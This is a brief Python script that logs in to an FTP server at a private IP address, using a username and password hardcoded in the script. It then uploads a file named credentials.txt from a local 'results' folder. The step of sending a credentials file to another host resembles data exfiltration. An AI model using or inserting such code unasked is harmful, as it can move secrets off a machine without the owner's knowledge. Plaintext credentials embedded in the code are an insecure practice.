#!/usr/bin/python
import ftplib
import os

## simple ftp file upload

filename = "credentials.txt"
ftp = ftplib.FTP("192.168.1.140")
ftp.login("paradox", "jiuo9y96")
ftp.cwd("/home/paradox/logs/")
os.chdir(r"C:\Users\32test\Downloads\results")
#os.chdir("/home/paradox/")
ftp.storlines("STOR " + filename, open(filename, 'r'))
